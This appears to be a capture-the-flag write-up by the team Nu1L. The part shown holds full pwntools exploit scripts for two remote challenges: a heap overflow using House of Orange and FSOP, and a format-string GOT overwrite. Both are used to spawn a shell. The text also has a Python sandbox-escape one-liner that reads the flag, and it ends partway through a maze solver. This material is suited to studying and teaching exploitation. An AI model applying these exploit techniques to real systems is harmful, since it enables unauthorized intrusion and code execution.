WriteUp By Nu1L
Author:Nu1L
 WriteUp By Nu1L
PWN
wind_farm_panel
shell
Misc
babymaze2_beta
babymaze1
WEB
hello_php
ezcms
easyci
Crypto
babyLWE
digits_missing
RE
friendlyRE
PWN
wind_farm_panel
free,
Orange+FSOP
from pwn import *
# s = process("./pwn")
s = remote("182.92.203.154","28452")
def add(idx,size,buf):
    s.sendlineafter("3.Modify wind turbine information","1")
    s.sendlineafter("Please enter the wind turbine to be turned on(0 ~ 5): 
",str(idx))
    s.sendlineafter("lease input the maximum power of this wind 
turbine:",str(size))
    s.sendafter("Your name: ",buf)
def edit(idx,buf):
    s.sendlineafter("3.Modify wind turbine information","3")
    s.sendlineafter("Which turbine: ",str(idx))
    s.sendafter("Please input: ",buf)
def show(idx):
    s.sendlineafter("3.Modify wind turbine information","2")
    s.sendlineafter("Please select the number of the wind turbine to be viewed: 
",str(idx))
add(0,0x200,'1\n')
edit(0,'A'*0x200+p64(0)+p64(0xdf1))
add(1,0x1000,'\n')
add(2,0x200,'\n')
show(2)
offset = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-0x3c510a
success(hex(offset))
libc = ELF("./libc-2.23.so",checksec=False)
libc.address = offset
_IO_list_all = libc.sym['_IO_list_all']
_IO_str_jumps = libc.address+0x3c37a0
system = libc.sym['system']
sh = next(libc.search("/bin/sh"))
context.arch='amd64'
fmt = FileStructure()
fmt._IO_buf_base = sh
fmt._IO_write_ptr = 1
fmt.vtable = _IO_str_jumps-8
payload = str(fmt).ljust(0xe8,'\x00')+p64(system)
payload = payload[0x20:]
print(len(payload))
edit(2,'A'*0x200+p64(0xfbad2084)+p64(0x61)+p64(0)+p64(_IO_list_all-
0x10)+payload+"\n")
s.sendlineafter("3.Modify wind turbine information","1")
s.sendlineafter("Please enter the wind turbine to be turned on(0 ~ 5): ","4")
s.sendlineafter("lease input the maximum power of this wind 
turbine:",str(0x100))
s.interactive()
shell
bg
Misc
from pwn import *
# s = process("./pwn")
s = remote("182.92.203.154","35264")
def bg(buf):
    tmp = "bg %1"+buf
    s.sendlineafter("$ ",tmp)
bg("AAAA%12$pBBBB")
s.recvuntil("AAA")
elf = ELF("./pwn")
tmp = int(s.recvuntil("BBBB",drop=True),16)-0x153b
elf.address = tmp
success(hex(tmp))
# gdb.attach(s,"b *$rebase(0x1616)\nc")
bg("AAAA%304$pBBBB")
s.recvuntil("AAA")
tmp = int(s.recvuntil("BBBB",drop=True),16)
libc = ELF("./libc-2.23.so")
offset = tmp-0x20840
libc.address = offset
success(hex(libc.address))
#174
context.arch = 'amd64'
atoi_got = elf.got['strcmp']
system = libc.sym['system']
payload = fmtstr_payload(174,{atoi_got:system},numbwritten=6)
bg('AAA'+payload)
s.sendline("/bin/shh\x00")
s.interactive()
8
babymaze2_beta
__import__('os').system('cat flag')
babymaze1
from pwn import *
context.log_level = 'debug'
import fuckpy3
dirs=[(0,1),(1,0),(0,-1),(-1,0)] 
path=[]              
def mark(maze,pos): 
    maze[pos[0]][pos[1]]=2
def passable(maze,pos): 
    return maze[pos[0]][pos[1]]==0
def find_path(maze,pos,end):
    mark(maze,pos)
    if pos[0]==end[0] and pos[1] == end[1]:
        print(pos,end=" ")  
        path.append(pos)
        return True
    for i in range(4):   
        nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1]
        if passable(maze,nextp):
            if find_path(maze,nextp,end):
                print(pos,end=" ")
                path.append(pos)
                return True
    return False
def see_path(maze,path):    
    for i,p in enumerate(path):
        if i==0:
            maze[p[0]][p[1]] ="E"
        elif i==len(path)-1:
            maze[p[0]][p[1]]="S"
        else:
            maze[p[0]][p[1]] =3
    print("\n")
    for r in maze:
        for c in r:
            if c==3:
                print('\033[0;31m'+"*"+" "+'\033[0m',end="")
            elif c=="S" or c=="E":
                print('\033[0;34m'+c+" " + '\033[0m', end="")
            elif c==2:
                print('\033[0;32m'+"#"+" "+'\033[0m',end="")
            elif c==1:
                print('\033[0;;40m'+" "*2+'\033[0m',end="")
            else:
                print(" "*2,end="")
        print()
def format_path():
    global path
    res = ''
    path = path[::-1]
    for i in range(len(path) - 1):
        t1 = path[i + 1][0] - path[i][0]
        t2 = path[i + 1][1] - path[i][1]
        if t1 == -1 and t2 == 0:
            res += 'w'